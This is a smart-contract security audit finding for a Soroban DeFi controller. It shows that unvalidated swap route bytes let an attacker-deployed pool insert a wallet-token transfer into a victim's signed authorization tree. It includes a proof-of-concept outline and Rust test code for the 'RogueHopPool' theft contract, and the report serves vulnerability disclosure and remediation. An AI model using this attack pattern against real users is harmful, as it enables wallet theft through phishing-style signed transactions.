### Title
Malicious swap route can inject an unauthorized wallet-token transfer into the caller's signed authorization tree - (File: contracts/controller/src/strategies/swap.rs)

### Summary
Controller strategy entrypoints accept opaque, caller-supplied `swap` bytes and forward them to the configured router without decoding or constraining the route's venue addresses. A malicious route can therefore execute an attacker-controlled pool that invokes `token.transfer(caller, attacker, amount)`; Soroban simulation records that transfer as a child of the caller's `swap_collateral` authorization, and signing the simulated tree executes the theft.

### Finding Description
`swap_collateral` takes an arbitrary `swap: Bytes` argument and forwards it into `SwapCollateralParams` unchanged. [1](#0-0) 

The strategy authenticates `caller`, verifies account ownership or delegation, withdraws collateral to the controller, and calls `withdraw_and_swap_from_supply` with those opaque bytes. [2](#0-1) 

`withdraw_and_swap_from_supply` passes the same bytes to `swap_tokens_or_passthrough`; for distinct token addresses, `swap_tokens` invokes `router.execute_strategy(controller, amount_in, swap)` without validating route contents. [3](#0-2) [4](#0-3) 

The controller's post-call checks only bound the controller's input-token spend and require positive output-token receipt; they do not prevent a nested venue contract from requesting additional authorization from the original `caller`. [5](#0-4) 

The regression fixture demonstrates the mechanism: a route-selected rogue pool calls `wallet_token.transfer(victim, attacker, WALLET_BALANCE)`, simulation records that call beneath the victim's `swap_collateral` authorization entry, and enforcement succeeds when the victim signs that poisoned tree. [6](#0-5) [7](#0-6) [8](#0-7) 

### Impact Explanation
A malicious frontend or compromised quote source can present a normal-looking collateral swap whose simulation includes an extra child authorization transferring any unrelated wallet token to the attacker. If the user signs the returned authorization tree, the transaction both completes a valid strategy and steals wallet funds outside the swap's input amount. [9](#0-8) 

The same opaque-route boundary is shared by `multiply`, `swap_debt`, `swap_collateral`, and `repay_debt_with_collateral`, so every route-driven strategy can carry this class of poisoned authorization. [10](#0-9) [11](#0-10) [12](#0-11) 

### Likelihood Explanation
The attack requires tricking a user into signing a simulation-generated authorization tree containing the extra token transfer, matching the phishing/UI-compromise bug class rather than a purely self-contained transaction. No privileged protocol role, leaked key, upgraded contract, or invalid market state is required; the attacker only supplies a crafted route through an unallowlisted venue. [13](#0-12) 

The strategy can return economically valid output and pass all controller balance-delta and final risk checks while the unrelated wallet transfer executes, so normal transaction success does not reveal the theft. [5](#0-4) [14](#0-13) 

### Recommendation
Restrict router hops to a governance-approved venue/pool registry or otherwise bind each encoded hop to an expected adapter and contract address, rather than allowing route bytes to select arbitrary executable code. At the controller boundary, treat route bytes as untrusted and document or enforce a transaction-signing rule that rejects any authorization child other than the expected token pulls; prefer an on-chain venue allowlist because client-side checks can be bypassed by a compromised interface. [15](#0-14) [16](#0-15) 

### Proof of Concept
1. Deploy `RogueHopPool` configured with `(victim, wallet_token, attacker, WALLET_BALANCE)`.
2. Encode a route whose hop pool is that contract and whose ordinary input/output tokens produce a fair strategy result.
3. Prompt the victim to invoke:

```text
controller.swap_collateral(
    caller = victim,
    account_id = victim_account,
    current = HubAssetKey(USDC),
    amount = 50_000_000_000,
    new = HubAssetKey(ETH),
    swap = malicious_route_bytes,
)
```

The test harness constructs exactly this argument shape and route deployment. [17](#0-16) 

4. During simulation, the rogue pool calls `wallet_token.transfer(victim, attacker, WALLET_BALANCE)`, which is recorded as a child invocation under `swap_collateral`. [18](#0-17) 
5. Signing the poisoned tree permits the transfer: the victim's unrelated wallet balance becomes zero, the attacker receives `WALLET_BALANCE`, and the strategy still credits the fair ETH output. [8](#0-7)

### Citations

**File:** contracts/controller/src/lib.rs (L283-301)
```rust
    fn swap_collateral(
        env: Env,
        caller: Address,
        account_id: u64,
        current: HubAssetKey,
        amount: i128,
        new: HubAssetKey,
        swap: Bytes,
    ) {
        strategies::swap_collateral::process_swap_collateral(
            &env,
            &caller,
            SwapCollateralParams {
                account_id,
                current: &current,
                from_amount: amount,
                new: &new,
                swap: &swap,
            },
```

**File:** contracts/controller/src/strategies/swap_collateral.rs (L40-64)
```rust
    require_authorized_caller(env, caller);

    assert_with_error!(env, current != new, GenericError::AssetsAreTheSame);
    config::require_hub_active(env, current.hub_id);
    require_positive_amount(env, from_amount);

    let mut account = storage::get_account(env, account_id);
    account::require_owner_or_delegate(env, account_id, caller, &account.owner);
    let mut cache = Context::new(env);
    // Check the destination before withdrawing existing collateral.
    require_can_supply(env, &mut cache, account.spoke_id, new);

    let extra_assets = vec![env, current.asset.clone(), new.asset.clone()];
    prefetch_strategy_prices(&mut cache, &account, &extra_assets);

    let swapped_amount = withdraw_and_swap_from_supply(
        env,
        &mut account,
        &mut cache,
        caller,
        current,
        from_amount,
        &new.asset,
        swap,
        events::PositionAction::SwColWd,
```

**File:** contracts/controller/src/strategies/legs.rs (L244-258)
```rust
    let supply_pos = get_supply_position_or_panic(env, account, from);

    let actual_withdrawn = withdraw_collateral_to_controller(
        env,
        account,
        cache,
        StrategyWithdraw {
            hub_asset: from,
            amount,
            position: &supply_pos,
            action,
        },
    );

    swap_tokens_or_passthrough(env, caller, &from.asset, actual_withdrawn, token_out, swap)
```

**File:** contracts/controller/src/strategies/swap.rs (L33-38)
```rust
    // Authorize only this token transfer to this router for this exact amount.
    authorize_transfer_as_current(env, token_in, &controller, &router_addr, amount_in);

    storage::with_flash_guard(env, || {
        let _ = router.execute_strategy(&controller, &amount_in, swap);
    });
```

**File:** contracts/controller/src/strategies/swap.rs (L40-54)
```rust
    // Reject input gains or overspending; refund only this swap's unused input.
    let in_after = token_in_client.balance(&controller);
    assert_with_error!(env, in_after <= in_before, StrategyError::RouterOverspend);
    let actual_spent = in_before - in_after;
    assert_with_error!(
        env,
        actual_spent <= amount_in,
        StrategyError::RouterOverspend
    );
    let leftover = amount_in - actual_spent;
    if leftover > 0 {
        token_in_client.transfer(&controller, refund_to, &leftover);
    }

    verify_router_output(env, token_out, out_before)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L50-70)
```rust
/// Attacker-deployed "pool". `amount == 0` is the benign control.
#[contract]
pub struct RogueHopPool;

#[contractimpl]
impl RogueHopPool {
    pub fn __constructor(env: Env, victim: Address, token: Address, to: Address, amount: i128) {
        env.storage()
            .instance()
            .set(&symbol_short!("PLAN"), &(victim, token, to, amount));
    }

    pub fn swap(env: Env) {
        let (victim, wallet_token, to, amount): (Address, Address, Address, i128) = env
            .storage()
            .instance()
            .get(&symbol_short!("PLAN"))
            .expect("plan is set by the constructor");
        if amount > 0 {
            token::Client::new(&env, &wallet_token).transfer(&victim, &to, &amount);
        }
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L111-124)
```rust
    fn route_through_pool_stealing(&self, amount: i128) -> Bytes {
        let plan = (
            self.alice.clone(),
            self.wallet_token.clone(),
            self.attacker.clone(),
            amount,
        );
        RoutedSwap {
            hop_pool: self.t.env.register(RogueHopPool, plan),
            min_out: FAIR_OUT_ETH,
            token_in: self.t.resolve_asset("USDC"),
            token_out: self.t.resolve_asset("ETH"),
        }
        .to_xdr(&self.t.env)
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L134-157)
```rust
    fn swap_args(&self, route: &Bytes) -> Vec<Val> {
        let (usdc, eth) = self.assets();
        (
            self.alice.clone(),
            self.account_id,
            usdc,
            SWAP_IN_USDC,
            eth,
            route.clone(),
        )
            .into_val(&self.t.env)
    }

    fn try_swap(&self, route: &Bytes) -> Result<(), soroban_sdk::Error> {
        let (usdc, eth) = self.assets();
        let ctrl = self.t.ctrl_client();
        let result = ctrl.try_swap_collateral(
            &self.alice,
            &self.account_id,
            &usdc,
            &SWAP_IN_USDC,
            &eth,
            route,
        );
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L194-226)
```rust
#[test]
fn simulation_records_the_rogue_pool_wallet_transfer_under_the_callers_swap_collateral_entry() {
    let s = Scene::new();
    let route = s.route_through_pool_stealing(WALLET_BALANCE);

    // `simulateTransaction` runs recording mode with non-root auth disabled.
    s.t.env.mock_all_auths();
    s.try_swap(&route)
        .expect("recording mode accepts the route");
    let recorded = s.t.env.auths();
    std::println!("recorded auth tree = {recorded:#?}");

    let stolen_transfer = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.wallet_token.clone(),
            symbol_short!("transfer"),
            (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        )),
        sub_invocations: std::vec![],
    };
    let poisoned_root = AuthorizedInvocation {
        function: AuthorizedFunction::Contract((
            s.t.controller.clone(),
            Symbol::new(&s.t.env, "swap_collateral"),
            s.swap_args(&route),
        )),
        sub_invocations: std::vec![stolen_transfer],
    };
    assert_eq!(recorded, std::vec![(s.alice.clone(), poisoned_root)]);

    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
    assert_eq!(s.t.supply_balance_raw(ALICE, "ETH"), FAIR_OUT_ETH);
```

**File:** tests/test-harness/tests/strategy/rogue_hop_pool_transfer_joins_caller_auth_tree.rs (L258-269)
```rust
    // Same route, with the tree that simulation returned.
    let stolen_transfer = MockAuthInvoke {
        contract: &s.wallet_token,
        fn_name: "transfer",
        args: (s.alice.clone(), s.attacker.clone(), WALLET_BALANCE).into_val(&s.t.env),
        sub_invokes: &[],
    };
    s.try_swap_with_signed_tree(&rogue, core::slice::from_ref(&stolen_transfer))
        .expect("the poisoned tree authorizes the rogue transfer");
    assert_eq!(s.wallet(&s.alice), 0);
    assert_eq!(s.wallet(&s.attacker), WALLET_BALANCE);
}
```

**File:** contracts/controller/src/strategies/mod.rs (L11-19)
```rust
pub(crate) mod flash_loan;
pub(crate) mod flash_position;
pub(crate) mod legs;
pub(crate) mod migrate_blend;
pub(crate) mod multiply;
pub(crate) mod repay_debt_with_collateral;
pub(crate) mod swap;
pub(crate) mod swap_collateral;
pub(crate) mod swap_debt;
```

**File:** contracts/controller/src/strategies/swap_debt.rs (L65-72)
```rust
    let repay_amount = swap_tokens_or_passthrough(
        env,
        caller,
        &new_debt.asset,
        amount_received,
        &existing_debt.asset,
        swap,
    );
```

**File:** contracts/controller/src/strategies/multiply.rs (L90-97)
```rust
    let swapped_collateral = swap_tokens_or_passthrough(
        env,
        caller,
        &debt.asset,
        swap_amount_in,
        &collateral.asset,
        swap,
    );
```

**File:** common/src/token.rs (L33-51)
```rust
/// Authorizes, on behalf of the current contract, one `transfer(from, to, amount)`
/// call on `token_addr` made deeper in the next contract call (for example by
/// the pool). The entry allows no further sub-invocations.
pub fn authorize_transfer_as_current(
    env: &Env,
    token_addr: &Address,
    from: &Address,
    to: &Address,
    amount: i128,
) {
    let entry = InvokerContractAuthEntry::Contract(SubContractInvocation {
        context: ContractContext {
            contract: token_addr.clone(),
            fn_name: symbol_short!("transfer"),
            args: (from.clone(), to.clone(), amount).into_val(env),
        },
        sub_invocations: Vec::new(env),
    });
    env.authorize_as_current_contract(vec![env, entry]);
```

**File:** docs/explanation/threat-model.md (L154-165)
```markdown
That bound covers the controller's own grant only. The router calls the pool
and token addresses its payload names and keeps no allowlist of them, so a
route can put third-party code on the call stack below the caller's
authorization. A token transfer that such code makes from the caller is
recorded by an honest simulation as a child of the caller's authorization
entry, and it executes if the caller signs that tree. The loss is then the
caller's wallet, not the routed amount, and neither the payload minimum nor the
final risk gate bounds it. An honest swap strategy gives the caller no child
entry, and a direct router swap gives exactly one input transfer. A client must
decode the route it signs and refuse an authorization tree with any other
child. The direct `execute_strategy` path has the same exposure for every swap
user.
```
